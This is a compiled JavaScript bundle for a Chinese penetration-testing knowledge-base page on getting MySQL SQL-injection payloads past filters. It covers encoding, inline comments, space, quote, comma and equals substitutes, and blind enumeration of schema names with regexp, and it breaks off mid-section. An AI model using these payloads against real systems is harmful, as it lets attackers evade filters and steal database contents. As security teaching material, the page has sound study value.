"use strict";(self.webpackChunkblog_source_2025=self.webpackChunkblog_source_2025||[]).push([[995],{2429:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>i,contentTitle:()=>r,default:()=>o,frontMatter:()=>t,metadata:()=>l,toc:()=>a});const l=JSON.parse('{"id":"\u6e17\u900f\u6d4b\u8bd5/WEB\u6f0f\u6d1e/SQL\u6ce8\u5165/MySQL/\u7ed5\u8fc7\u6280\u5de7","title":"\u7ed5\u8fc7\u6280\u5de7","description":"\u901a\u7528\u65b9\u6cd5","source":"@site/docs/01.\u6e17\u900f\u6d4b\u8bd5/02.WEB\u6f0f\u6d1e/01.SQL\u6ce8\u5165/03.MySQL/03.\u7ed5\u8fc7\u6280\u5de7.md","sourceDirName":"01.\u6e17\u900f\u6d4b\u8bd5/02.WEB\u6f0f\u6d1e/01.SQL\u6ce8\u5165/03.MySQL","slug":"/\u6e17\u900f\u6d4b\u8bd5/WEB\u6f0f\u6d1e/SQL\u6ce8\u5165/MySQL/\u7ed5\u8fc7\u6280\u5de7","permalink":"/docs/\u6e17\u900f\u6d4b\u8bd5/WEB\u6f0f\u6d1e/SQL\u6ce8\u5165/MySQL/\u7ed5\u8fc7\u6280\u5de7","draft":false,"unlisted":false,"tags":[],"version":"current","lastUpdatedBy":"d4m1ts","lastUpdatedAt":1749874405000,"sidebarPosition":3,"frontMatter":{},"sidebar":"knowledgeBaseSidebar","previous":{"title":"\u5404\u79cd\u6ce8\u5165\u624b\u6cd5","permalink":"/docs/\u6e17\u900f\u6d4b\u8bd5/WEB\u6f0f\u6d1e/SQL\u6ce8\u5165/MySQL/\u5404\u79cd\u6ce8\u5165\u624b\u6cd5"},"next":{"title":"innodb\u5b58\u50a8\u5f15\u64ce","permalink":"/docs/\u6e17\u900f\u6d4b\u8bd5/WEB\u6f0f\u6d1e/SQL\u6ce8\u5165/MySQL/innodb\u5b58\u50a8\u5f15\u64ce"}}');var c=s(74848),d=s(28453);const t={},r=void 0,i={},a=[{value:"\u901a\u7528\u65b9\u6cd5",id:"\u901a\u7528\u65b9\u6cd5",level:2},{value:"\u7f16\u7801",id:"\u7f16\u7801",level:3},{value:"\u5185\u8054\u6ce8\u91ca",id:"\u5185\u8054\u6ce8\u91ca",level:3},{value:"\u7ed5\u8fc7\u7a7a\u683c",id:"\u7ed5\u8fc7\u7a7a\u683c",level:2},{value:"\u7ed5\u8fc7\u5f15\u53f7",id:"\u7ed5\u8fc7\u5f15\u53f7",level:2},{value:"\u5341\u516d\u8fdb\u5236hex()",id:"\u5341\u516d\u8fdb\u5236hex",level:3},{value:"char()",id:"char",level:3},{value:"\u7ed5\u8fc7\u9017\u53f7,",id:"\u7ed5\u8fc7\u9017\u53f7",level:2},{value:"\u9488\u5bf9\u666e\u901a\u60c5\u51b5\uff08\u4f7f\u7528<code>join</code>\uff09",id:"\u9488\u5bf9\u666e\u901a\u60c5\u51b5\u4f7f\u7528join",level:3},{value:"\u9488\u5bf9<code>limit</code>\uff08\u4f7f\u7528<code>offset</code>\uff09",id:"\u9488\u5bf9limit\u4f7f\u7528offset",level:3},{value:"\u9488\u5bf9\u5207\u5272\u51fd\u6570",id:"\u9488\u5bf9\u5207\u5272\u51fd\u6570",level:3},{value:"\u7ed5\u8fc7\u7b49\u53f7=",id:"\u7ed5\u8fc7\u7b49\u53f7",level:2},{value:"\u7ed5\u8fc7and/or",id:"\u7ed5\u8fc7andor",level:2},{value:"\u7ed5\u8fc7\u62ec\u53f7",id:"\u7ed5\u8fc7\u62ec\u53f7",level:2},{value:"\u83b7\u53d6\u6240\u6709\u6570\u636e\u5e93\u540d",id:"\u83b7\u53d6\u6240\u6709\u6570\u636e\u5e93\u540d",level:3},{value:"\u83b7\u53d6\u8868\u540d",id:"\u83b7\u53d6\u8868\u540d",level:3},{value:"\u83b7\u53d6\u5217\u540d",id:"\u83b7\u53d6\u5217\u540d",level:3},{value:"\u7ed5\u8fc7\u6ce8\u91ca\u7b26",id:"\u7ed5\u8fc7\u6ce8\u91ca\u7b26",level:2},{value:"\u7ed5\u8fc7\u51fd\u6570\u68c0\u6d4b",id:"\u7ed5\u8fc7\u51fd\u6570\u68c0\u6d4b",level:2},{value:"\u7ed5\u8fc7\u5173\u952e\u8bcd",id:"\u7ed5\u8fc7\u5173\u952e\u8bcd",level:2},{value:"\u7ed5\u8fc7order by",id:"\u7ed5\u8fc7order-by",level:2},{value:"\u7ed5\u8fc7select",id:"\u7ed5\u8fc7select",level:2}];function h(e){const n={a:"a",admonition:"admonition",code:"code",h2:"h2",h3:"h3",img:"img",p:"p",pre:"pre",strong:"strong",table:"table",tbody:"tbody",td:"td",th:"th",thead:"thead",tr:"tr",...(0,d.R)(),...e.components};return(0,c.jsxs)(c.Fragment,{children:[(0,c.jsx)(n.h2,{id:"\u901a\u7528\u65b9\u6cd5",children:"\u901a\u7528\u65b9\u6cd5"}),"\n",(0,c.jsx)(n.p,{children:"\u901a\u7528\u7684\u65b9\u6cd5\uff0c\u5c31\u662f\u4e07\u91d1\u6cb9\uff0c\u65e0\u975e\u5c31\u662f\u5927\u5c0f\u5199\u3001\u53cc\u5199\u3001\u7f16\u7801\u3001\u6ce8\u91ca\u3001HPP\u3001\u5783\u573e\u5b57\u7b26\u3001\u5206\u5757\u4f20\u8f93\u3001WAF\u7279\u6027"}),"\n",(0,c.jsxs)(n.p,{children:["\u5b98\u65b9\u51fd\u6570\u6587\u6863\uff1a",(0,c.jsx)(n.a,{href:"https://dev.mysql.com/doc/refman/8.0/en/functions.html",children:"https://dev.mysql.com/doc/refman/8.0/en/functions.html"})]}),"\n",(0,c.jsx)(n.h3,{id:"\u7f16\u7801",children:"\u7f16\u7801"}),"\n",(0,c.jsx)(n.p,{children:"\u7f16\u7801\u65e0\u975e\u5c31\u662fhex\u3001url\u7b49\u7b49\u7f16\u7801\uff0c\u8ba9\u4f20\u5230\u6570\u636e\u5e93\u7684\u6570\u636e\u80fd\u591f\u89e3\u6790\u7684\u5373\u53ef\uff0c\u6bd4\u5982URL\u7f16\u7801\u4e00\u822c\u5728\u4f20\u7ed9\u4e1a\u52a1\u7684\u65f6\u5019\u5c31\u4f1a\u81ea\u52a8\u89e3\u7801\u3002"}),"\n",(0,c.jsx)(n.h3,{id:"\u5185\u8054\u6ce8\u91ca",children:"\u5185\u8054\u6ce8\u91ca"}),"\n",(0,c.jsx)(n.p,{children:"\u53ef\u4ee5\u63d2\u5230\u62ec\u53f7\u4e2d\uff0c\u4f46\u662f\u5fc5\u987b\u8981\u4fdd\u8bc1\u5355\u8bcd\u7684\u5b8c\u6574"}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-sql",children:"select 1/*!union*/select 2;\nselect /*!user(*/);\n/*!41320select/*!/*!10000user/*!(/*!/*!/*!*/);\n"})}),"\n",(0,c.jsx)(n.h2,{id:"\u7ed5\u8fc7\u7a7a\u683c",children:"\u7ed5\u8fc7\u7a7a\u683c"}),"\n",(0,c.jsx)(n.p,{children:"\u7a7a\u683c\u88ab\u8fc7\u6ee4\u7684\u60c5\u51b5\uff0c\u53ef\u4ee5\u7528\u5982\u4e0b\u7684\u4e00\u4e9b\u624b\u6cd5\uff1a"}),"\n",(0,c.jsxs)(n.table,{children:[(0,c.jsx)(n.thead,{children:(0,c.jsxs)(n.tr,{children:[(0,c.jsx)(n.th,{children:"\u8bf4\u660e"}),(0,c.jsx)(n.th,{children:"Payload"})]})}),(0,c.jsxs)(n.tbody,{children:[(0,c.jsxs)(n.tr,{children:[(0,c.jsx)(n.td,{children:"\u4f7f\u7528\u6ce8\u91ca\u7b26"}),(0,c.jsxs)(n.td,{children:[(0,c.jsx)(n.code,{children:"select/**/user();"}),(0,c.jsx)("br",{}),(0,c.jsx)(n.code,{children:"select/*hahaha*/user();"})]})]}),(0,c.jsxs)(n.tr,{children:[(0,c.jsx)(n.td,{children:"URL\u7f16\u7801\u7a7a\u683c"}),(0,c.jsx)(n.td,{children:(0,c.jsx)(n.code,{children:"+"})})]}),(0,c.jsxs)(n.tr,{children:[(0,c.jsx)(n.td,{children:"\u5176\u4ed6URL\u7f16\u7801\uff08\u6362\u884c\u3001Tab\u7b49\uff09"}),(0,c.jsxs)(n.td,{children:[(0,c.jsx)(n.code,{children:"%0d"}),"\u3001",(0,c.jsx)(n.code,{children:"%0a"}),"\u3001",(0,c.jsx)(n.code,{children:"%09"}),"\u3001",(0,c.jsx)(n.code,{children:"%0b"}),"\u3001",(0,c.jsx)(n.code,{children:"%a0"})]})]}),(0,c.jsxs)(n.tr,{children:[(0,c.jsx)(n.td,{children:"\u4f7f\u7528\u62ec\u53f7\uff0c\u62ec\u53f7\u662f\u7528\u6765\u5305\u56f4\u5b50\u67e5\u8be2\u7684\uff1b\u56e0\u6b64\u4efb\u4f55\u53ef\u4ee5\u8ba1\u7b97\u51fa\u7ed3\u679c\u7684\u8bed\u53e5\uff0c\u90fd\u53ef\u4ee5\u7528\u62ec\u53f7\u5305\u56f4\u8d77\u6765\u3002\u800c\u62ec\u53f7\u7684\u4e24\u7aef\uff0c\u53ef\u4ee5\u6ca1\u6709\u591a\u4f59\u7684\u7a7a\u683c"}),(0,c.jsx)(n.td,{children:(0,c.jsx)(n.code,{children:"select(user())from(t_user);"})})]})]})]}),"\n",(0,c.jsxs)(n.p,{children:["\u5982\u679c\u662f",(0,c.jsx)(n.code,{children:"and/or"}),"\u540e\u9762\u7684\u7a7a\u683c\u9700\u8981\u7ed5\u8fc7\u7684\u8bdd\uff0c\u53ef\u4ee5\u8ddf\u4e0a\u5947\u6216\u8005\u5076\u6570\u4e2a",(0,c.jsx)(n.code,{children:"!"}),"\u3001",(0,c.jsx)(n.code,{children:"~"}),"\u6765\u66ff\u4ee3\u7a7a\u683c\uff0c\u4e5f\u53ef\u4ee5\u6df7\u5408\u4f7f\u7528(\u89c4\u5f8b\u6709\u4e0d\u540c\uff0c\u53ef\u4ee5\u81ea\u5df1\u672c\u5730\u5c1d\u8bd5)\uff0c",(0,c.jsxs)(n.strong,{children:[(0,c.jsx)(n.code,{children:"and/or"}),"\u524d\u7684\u7a7a\u683c\u53ef\u7528\u7701\u7565"]})]}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-sql",children:'select * from user where username="test"and!!!1=1;\nselect * from user where username="test"and~~~~1=1;\nselect * from user where username="test"and~~!!!~~1=1;\n'})}),"\n",(0,c.jsxs)(n.p,{children:["\u4e5f\u53ef\u4ee5\u7528",(0,c.jsx)(n.code,{children:"+"}),"\u3001",(0,c.jsx)(n.code,{children:"-"}),"\u6765\u66ff\u4ee3\u7a7a\u683c\uff0c",(0,c.jsx)(n.code,{children:"and"}),"\u540e\u6709\u5076\u6570\u4e2a",(0,c.jsx)(n.code,{children:"-"}),"\u5373\u53ef\uff0c",(0,c.jsx)(n.code,{children:"+"}),"\u7684\u4e2a\u6570\u968f\u610f"]}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-sql",children:'select * from user where username="test"and------1=1;\nselect * from user where username="test"and+++---+++---+++1=1;\n'})}),"\n",(0,c.jsx)(n.h2,{id:"\u7ed5\u8fc7\u5f15\u53f7",children:"\u7ed5\u8fc7\u5f15\u53f7"}),"\n",(0,c.jsx)(n.h3,{id:"\u5341\u516d\u8fdb\u5236hex",children:"\u5341\u516d\u8fdb\u5236hex()"}),"\n",(0,c.jsx)(n.p,{children:"\u5355/\u53cc\u5f15\u53f7\u88ab\u8fc7\u6ee4\uff0c\u4e00\u822c\u91c7\u752816\u8fdb\u5236\u7ed5\u8fc7\uff0c\u7279\u6b8a\u60c5\u51b5\u53ef\u91c7\u7528\u5bbd\u5b57\u8282\u6ce8\u5165"}),"\n",(0,c.jsx)(n.p,{children:"Python \u4e00\u53e5\u8bdd\u5b57\u7b26\u4e32\u8f6c16\u8fdb\u5236"}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-python",children:'s="test"\t# \u5047\u8bbe\u8981\u8f6c\u6362\u7684\u5b57\u7b26\u4e32\u4e3atest\uff0c\u7ed3\u679c\u4e3a 0x74657374\n"0x" + "".join([hex(ord(c)).replace(\'0x\', \'\') for c in s])\n'})}),"\n",(0,c.jsx)(n.p,{children:"sql\u4e00\u53e5\u8bdd"}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-sql",children:'select concat("0x",hex("test"));\n'})}),"\n",(0,c.jsx)(n.p,{children:"\u7ed5\u8fc7Payload"}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-sql",children:"-- \u539f\u8bed\u53e5\nselect table_name from information_schema.tables where table_schema='test';\n-- 16\u8fdb\u5236\u540e\nselect table_name from information_schema.tables where table_schema=0x74657374;\n"})}),"\n",(0,c.jsx)(n.p,{children:(0,c.jsx)(n.img,{alt:"image-20220120144010351",src:s(46445).A+"",width:"1736",height:"318"})}),"\n",(0,c.jsx)(n.h3,{id:"char",children:"char()"}),"\n",(0,c.jsx)(n.p,{children:"\u9664\u4e86\u4e0a\u9762\u7684\u5341\u516d\u8fdb\u5236\u5916\uff0c\u8fd8\u53ef\u4ee5\u7528char\u51fd\u6570\u8fde\u63a5\u8d77\u6765"}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-sql",children:"select table_name from information_schema.tables where table_schema='test';\n-- char\u540e\nselect table_name from information_schema.tables where table_schema=char(116,101,115,116);\n"})}),"\n",(0,c.jsx)(n.p,{children:(0,c.jsx)(n.img,{alt:"image-20220125102843243",src:s(59576).A+"",width:"1968",height:"372"})}),"\n",(0,c.jsx)(n.h2,{id:"\u7ed5\u8fc7\u9017\u53f7",children:"\u7ed5\u8fc7\u9017\u53f7,"}),"\n",(0,c.jsxs)(n.p,{children:["\u4e00\u822c\u8f83\u591a\u51fa\u73b0\u5728\u9700\u8981\u4f7f\u7528",(0,c.jsx)(n.code,{children:"limit"}),"\u3001",(0,c.jsx)(n.code,{children:"substr/mid"}),"\u7b49\u51fd\u6570\u65f6"]}),"\n",(0,c.jsxs)(n.h3,{id:"\u9488\u5bf9\u666e\u901a\u60c5\u51b5\u4f7f\u7528join",children:["\u9488\u5bf9\u666e\u901a\u60c5\u51b5\uff08\u4f7f\u7528",(0,c.jsx)(n.code,{children:"join"}),"\uff09"]}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-sql",children:"-- \u539f\u8bed\u53e5\nselect user(),database();\n\n-- \u7ed5\u8fc7\nselect * from (select user())a join (select database())b;\n"})}),"\n",(0,c.jsxs)(n.h3,{id:"\u9488\u5bf9limit\u4f7f\u7528offset",children:["\u9488\u5bf9",(0,c.jsx)(n.code,{children:"limit"}),"\uff08\u4f7f\u7528",(0,c.jsx)(n.code,{children:"offset"}),"\uff09"]}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-sql",children:"-- \u539f\u8bed\u53e5\nselect * from t_user limit 1,1\n-- \u7ed5\u8fc7\nselect * from t_user limit 1 offset 1;\n"})}),"\n",(0,c.jsx)(n.p,{children:(0,c.jsx)(n.img,{alt:"image-20220120144327470",src:s(3770).A+"",width:"940",height:"678"})}),"\n",(0,c.jsx)(n.h3,{id:"\u9488\u5bf9\u5207\u5272\u51fd\u6570",children:"\u9488\u5bf9\u5207\u5272\u51fd\u6570"}),"\n",(0,c.jsx)(n.p,{children:(0,c.jsxs)(n.strong,{children:["1\u3001\u4f7f\u7528",(0,c.jsx)(n.code,{children:"from for"})]})}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-sql",children:"-- \u539f\u8bed\u53e5\nselect substr(username,1,1) from t_user;\n-- \u7ed5\u8fc7\nselect substr(username from 1 for 1) from t_user;\n"})}),"\n",(0,c.jsx)(n.p,{children:(0,c.jsx)(n.img,{alt:"image-20220120144651929",src:s(28595).A+"",width:"1146",height:"796"})}),"\n",(0,c.jsx)(n.p,{children:(0,c.jsx)(n.strong,{children:"2\u3001\u4e0d\u4f7f\u7528\u5207\u5272\u51fd\u6570\uff0c\u91c7\u7528\u6a21\u7cca\u6216\u8005\u6b63\u5219\u5339\u914d\u7684\u65b9\u6cd5"})}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-sql",children:'-- \u539f\u8bed\u53e5\nselect substr(username,1,1) from t_user;\n-- \u7ed5\u8fc7\nselect username from t_user where username like "u%";\n'})}),"\n",(0,c.jsx)(n.h2,{id:"\u7ed5\u8fc7\u7b49\u53f7",children:"\u7ed5\u8fc7\u7b49\u53f7="}),"\n",(0,c.jsx)(n.p,{children:"\u8fc7\u6ee4\u4e86\u7b49\u53f7\u6216\u8005\u76f8\u5173\u7684\u5339\u914d\u7b26\uff0c\u53ef\u4ee5\u91c7\u7528\u5982\u4e0b\u7684\u4e00\u4e9b\u624b\u6cd5\u6765\u7ed5\u8fc7"}),"\n",(0,c.jsxs)(n.table,{children:[(0,c.jsx)(n.thead,{children:(0,c.jsxs)(n.tr,{children:[(0,c.jsx)(n.th,{style:{textAlign:"left"},children:"Payload"}),(0,c.jsx)(n.th,{style:{textAlign:"left"},children:"\u8bf4\u660e"})]})}),(0,c.jsxs)(n.tbody,{children:[(0,c.jsxs)(n.tr,{children:[(0,c.jsxs)(n.td,{style:{textAlign:"left"},children:[(0,c.jsx)(n.code,{children:"<>"}),"\u3001",(0,c.jsx)(n.code,{children:">"}),"\u3001",(0,c.jsx)(n.code,{children:"<"})]}),(0,c.jsx)(n.td,{style:{textAlign:"left"},children:"\u4e0d\u7b49\u7b26\u3001\u5927\u4e8e\u3001\u5c0f\u4e8e"})]}),(0,c.jsxs)(n.tr,{children:[(0,c.jsxs)(n.td,{style:{textAlign:"left"},children:[(0,c.jsx)(n.code,{children:"select 1 between 1 and 2;"}),(0,c.jsx)("br",{}),(0,c.jsx)(n.code,{children:"select 1 not between 1 and 2;"})]}),(0,c.jsx)(n.td,{style:{textAlign:"left"},children:"between\u8bed\u53e5\uff0c\u5728\u4e24\u503c\u4e4b\u95f4"})]}),(0,c.jsxs)(n.tr,{children:[(0,c.jsxs)(n.td,{style:{textAlign:"left"},children:[(0,c.jsx)(n.code,{children:"select 1 in (1);"}),(0,c.jsx)("br",{}),(0,c.jsx)(n.code,{children:"select 1 not in (1);"})]}),(0,c.jsx)(n.td,{style:{textAlign:"left"},children:"in\u8bed\u53e5\uff0c\u5728\u96c6\u5408\u4e2d"})]}),(0,c.jsxs)(n.tr,{children:[(0,c.jsx)(n.td,{style:{textAlign:"left"},children:(0,c.jsx)(n.code,{children:"select '123' like '1%';"})}),(0,c.jsx)(n.td,{style:{textAlign:"left"},children:"like\u6a21\u7cca\u5339\u914d"})]}),(0,c.jsxs)(n.tr,{children:[(0,c.jsx)(n.td,{style:{textAlign:"left"},children:(0,c.jsx)(n.code,{children:"select '123' regexp '^12.*';"})}),(0,c.jsx)(n.td,{style:{textAlign:"left"},children:"regexp\u6b63\u5219\u5339\u914d"})]}),(0,c.jsxs)(n.tr,{children:[(0,c.jsx)(n.td,{style:{textAlign:"left"},children:(0,c.jsx)(n.code,{children:"select '123' rlike '^12.*';"})}),(0,c.jsx)(n.td,{style:{textAlign:"left"},children:"Rlike\u6b63\u5219\u5339\u914d"})]}),(0,c.jsxs)(n.tr,{children:[(0,c.jsx)(n.td,{style:{textAlign:"left"},children:(0,c.jsx)(n.code,{children:'select regexp_like("abc","^ab");'})}),(0,c.jsx)(n.td,{style:{textAlign:"left"},children:"regexp_like\u51fd\u6570\u6b63\u5219\u5339\u914d"})]})]})]}),"\n",(0,c.jsx)(n.h2,{id:"\u7ed5\u8fc7andor",children:"\u7ed5\u8fc7and/or"}),"\n",(0,c.jsx)(n.p,{children:"\u5982\u679c\u4e0d\u80fd\u5927\u5c0f\u5199\u3001\u53cc\u5199\u3001\u6ce8\u91ca\u7b49\u4e07\u91d1\u6cb9\u624b\u6cd5\u7ed5\u8fc7\u7684\u8bdd\uff0c\u53ef\u4ee5\u8bd5\u8bd5\u4e0b\u9762\u7684\u65b9\u6cd5"}),"\n",(0,c.jsxs)(n.p,{children:["\u56e0\u4e3a",(0,c.jsx)(n.code,{children:"and"}),"\u548c",(0,c.jsx)(n.code,{children:"or"}),"\u4e3b\u8981\u4e5f\u662f\u8d77\u5230\u8fde\u63a5\u6211\u4eec\u62fc\u63a5\u8bed\u53e5\u7684\u4f5c\u7528\uff0c\u90a3\u6211\u4eec\u627e\u5176\u4ed6\u7c7b\u4f3c\u529f\u80fd\u7684\u7b97\u672f\u7b26\u7b49\u5373\u53ef"]}),"\n",(0,c.jsxs)(n.table,{children:[(0,c.jsx)(n.thead,{children:(0,c.jsxs)(n.tr,{children:[(0,c.jsx)(n.th,{style:{textAlign:"left"},children:"Payload"}),(0,c.jsx)(n.th,{style:{textAlign:"left"},children:"\u8bf4\u660e"})]})}),(0,c.jsxs)(n.tbody,{children:[(0,c.jsxs)(n.tr,{children:[(0,c.jsx)(n.td,{style:{textAlign:"left"},children:(0,c.jsx)(n.code,{children:"select * from user where age=666 && 1;"})}),(0,c.jsx)(n.td,{style:{textAlign:"left"},children:"and\u7684\u7b26\u53f7\u7248"})]}),(0,c.jsxs)(n.tr,{children:[(0,c.jsx)(n.td,{style:{textAlign:"left"},children:"`select * from user where age=666"}),(0,c.jsx)(n.td,{style:{textAlign:"left"}})]}),(0,c.jsxs)(n.tr,{children:[(0,c.jsx)(n.td,{style:{textAlign:"left"},children:(0,c.jsx)(n.code,{children:"select * from user where age=666 ^ 0;"})}),(0,c.jsxs)(n.td,{style:{textAlign:"left"},children:["\u6309\u4f4d\u4e0e\u3001\u6216\u3001\u5f02\u6216\u3001\u4f4d\u79fb ",(0,c.jsx)(n.code,{children:"&\uff5c^ << >>"})]})]}),(0,c.jsxs)(n.tr,{children:[(0,c.jsx)(n.td,{style:{textAlign:"left"},children:(0,c.jsx)(n.code,{children:"select * from user where age=666 - sleep(2);"})}),(0,c.jsxs)(n.td,{style:{textAlign:"left"},children:["\u52a0\u51cf\u4e58\u9664mod",(0,c.jsx)(n.code,{children:"+-*/ div % mod"}),"\uff08\u5c3d\u91cf\u4e0d\u8981\u4f7f\u7528\uff0c\u4f1a\u4f11\u77202*\u6570\u636e\u6761\u6570\u8fd9\u4e48\u591a\u79d2\uff09"]})]})]})]}),"\n",(0,c.jsx)(n.p,{children:"\u8d34\u4e00\u5f20\u83dc\u9e1f\u6559\u7a0b\u7684\u56fe"}),"\n",(0,c.jsx)(n.p,{children:(0,c.jsx)(n.img,{alt:"img",src:s(95347).A+"",width:"755",height:"442"})}),"\n",(0,c.jsx)(n.admonition,{type:"tip",children:(0,c.jsxs)(n.p,{children:["\u5982\u679c\u4e0a\u9762\u90fd\u4e0d\u884c\u7684\u8bdd\uff0c\u53ef\u4ee5\u8003\u8651\u91c7\u7528",(0,c.jsx)(n.a,{href:"./%E5%90%84%E7%A7%8D%E6%B3%A8%E5%85%A5%E6%89%8B%E6%B3%95",children:(0,c.jsx)(n.strong,{children:"False\u6ce8\u5165"})}),"\u6765\u7ed5\u8fc7"]})}),"\n",(0,c.jsx)(n.h2,{id:"\u7ed5\u8fc7\u62ec\u53f7",children:"\u7ed5\u8fc7\u62ec\u53f7"}),"\n",(0,c.jsxs)(n.p,{children:["\u5c0f\u62ec\u53f7\u88ab\u8fc7\u6ee4\uff0c\u8bf8\u5982",(0,c.jsx)(n.code,{children:"substring()"}),"\u7b49\u5b57\u7b26\u4e32\u622a\u53d6\u51fd\u6570\u65e0\u6cd5\u4f7f\u7528\uff0c\u53ef\u4ee5\u7528like \u6216\u8005 regexp \u901a\u8fc7\u6b63\u5219\u6765\u4e00\u4f4d\u4e00\u4f4d\u7684\u6bd4\u8f83\u7ed5\u8fc7"]}),"\n",(0,c.jsx)(n.admonition,{type:"tip",children:(0,c.jsxs)(n.p,{children:["\u4e00\u822c\u7528\u4e8e\u76f2\u6ce8\u7684\u60c5\u51b5\uff0c\u6839\u636e\u8fd4\u56de\u7ed3\u679c\u662f",(0,c.jsx)(n.code,{children:"true/false"}),"\u6765\u5224\u65ad"]})}),"\n",(0,c.jsx)(n.h3,{id:"\u83b7\u53d6\u6240\u6709\u6570\u636e\u5e93\u540d",children:"\u83b7\u53d6\u6240\u6709\u6570\u636e\u5e93\u540d"}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-sql",children:'-- \u6240\u6709\u6570\u636e\u5e93\u540d\nselect distinct table_schema from information_schema.tables where table_schema like "%%";\n-- t\u5f00\u5934\u7684\u6570\u636e\u5e93\u540d\nselect distinct table_schema from information_schema.tables where table_schema like "t%";\n-- \u6240\u6709\u6570\u636e\u5e93\u540d\nselect distinct table_schema from information_schema.tables where table_schema regexp "^.*$";\n-- t\u5f00\u5934\u7684\u6570\u636e\u5e93\u540d\nselect distinct table_schema from information_schema.tables where table_schema regexp "^t.*$";\n'})}),"\n",(0,c.jsx)(n.p,{children:(0,c.jsx)(n.img,{alt:"image-20220125104250431",src:s(6461).A+"",width:"2032",height:"620"})}),"\n",(0,c.jsx)(n.h3,{id:"\u83b7\u53d6\u8868\u540d",children:"\u83b7\u53d6\u8868\u540d"}),"\n",(0,c.jsxs)(n.p,{children:["\u4ee5\u6570\u636e\u5e93",(0,c.jsx)(n.code,{children:"test"}),"\u4e3a\u4f8b"]}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-sql",children:"select distinct table_name from information_schema.tables where table_schema = 'test' and table_name regexp \"^u.*$\"; -- true\nselect distinct table_name from information_schema.tables where table_schema = 'test' and table_name regexp \"^us.*$\"; -- true\nselect distinct table_name from information_schema.tables where table_schema = 'test' and table_name regexp \"^usa.*$\"; -- false\n"})}),"\n",(0,c.jsx)(n.p,{children:(0,c.jsx)(n.img,{alt:"image-20220125104519275",src:s(55021).A+"",width:"2566",height:"460"})}),"\n",(0,c.jsx)(n.h3,{id:"\u83b7\u53d6\u5217\u540d",children:"\u83b7\u53d6\u5217\u540d"}),"\n",(0,c.jsxs)(n.p,{children:["\u6b64\u65f6\u8868\u540d",(0,c.jsx)(n.code,{children:"test.user"})]}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-sql",children:"select distinct column_name from information_schema.columns where table_schema = 'test' and table_name = 'user' and column_name regexp \"^.*$\"; -- true\nselect distinct column_name from information_schema.columns where table_schema = 'test' and table_name = 'user' and column_name regexp \"^a.*$\"; -- true\nselect distinct column_name from information_schema.columns where table_schema = 'test' and table_name = 'user' and column_name regexp \"^ab.*$\"; -- false\n"})}),"\n",(0,c.jsx)(n.p,{children:(0,c.jsx)(n.img,{alt:"image-20220125104854147",src:s(89185).A+"",width:"3076",height:"456"})}),"\n",(0,c.jsx)(n.h2,{id:"\u7ed5\u8fc7\u6ce8\u91ca\u7b26",children:"\u7ed5\u8fc7\u6ce8\u91ca\u7b26"}),"\n",(0,c.jsx)(n.p,{children:"\u5bf9\u6ce8\u91ca\u7b26\u8fc7\u6ee4\u7684\u60c5\u51b5\u4e0b\uff0c\u5bf9\u6211\u4eec\u6765\u8bf4\u95ee\u9898\u53ef\u80fd\u5c31\u662f\u8bed\u53e5\u4e0d\u80fd\u6b63\u5e38\u6267\u884c"}),"\n",(0,c.jsx)(n.p,{children:"\u89e3\u51b3\u529e\u6cd5\u4e5f\u5f88\u7b80\u5355\uff0c\u7528\u5b8c\u6574\u8bed\u53e5\u7ed9\u4ed6\u95ed\u5408\u5c31OK\u4e86\uff0c\u5176\u4ed6\u8bed\u53e5\u7c7b\u4f3c"}),"\n",(0,c.jsx)(n.pre,{children:(0,c.jsx)(n.code,{className:"language-sql",children:"# \u539f\u59cb\n?id=1\n# \u5b8c\u6574\u95ed\u5408\n?id=1' and expr and '1'='1\n"})}),"\n",(0,c.jsx)(n.h2,{id:"\u7ed5\u8fc7\u51fd\u6570\u68c0\u6d4b",children:"\u7ed5\u8fc7\u51fd\u6570\u68c0\u6d4b"}),"\n",(0,c.jsxs)(n.p,{children:["\u4e00\u4e9b\u51fd\u6570\u5982",(0,c.jsx)(n.code,{children:"ascii"}),"\u7b49\u88ab\u8fc7\u6ee4\uff0c\u53ef\u4ee5\u4f7f\u7528\u7b49\u4ef7\u7684\u51fd\u6570\u8fdb\u884c\u7ed5\u8fc7\uff0c\u5982"]}),"\n",(0,c.jsxs)(n.table,{children:[(0,c.jsx)(n.thead,{children:(0,c.jsxs)(n.tr,{children:[(0,c.jsx)(n.th,{children:"\u8fc7\u6ee4\u51fd\u6570"}),(0,c.jsx)(n.th,{children:"\u7b49\u4ef7\u51fd\u6570"})]})}),(0,c.jsxs)(n.tbody,{children:[(0,c.jsxs)(n.tr,{children:[(0,c.jsx)(n.td,{children:(0,c.jsx)(n.code,{children:"ascii()"})}),(0,c.jsxs)(n.td,{children:[(0,c.jsx)(n.code,{children:"hex()"}),"\u3001",(0,c.jsx)(n.code,{children:"ord()"}),"\u3001",(0,c.jsx)(n.code,{children:"bin()"})]})]}),(0,c.jsxs)(n.tr,{children:[(0,c.jsx)(n.td,{children:(0,c.jsx)(n.code,{children:"sleep()"})}),(0,c.jsx)(n.td,{children:(0,c.jsx)(n.code,{children:"benchmark()"})})]})]})]}),"\n",(0,c.jsx)(n.p,{children:"\u7b49\uff0c\u5f88\u591a\uff0c\u8fd8\u662f\u5f97\u81ea\u5df1\u53bb\u7814\u7a76mysql\u7684\u51fd\u6570\u624d\u884c"}),"\n",(0,c.jsx)(n.h2,{id:"\u7ed5\u8fc7\u5173\u952e\u8bcd",children:"\u7ed5\u8fc7\u5173\u952e\u8bcd"}),"\n",(0,c.jsxs)(n.p,{children:["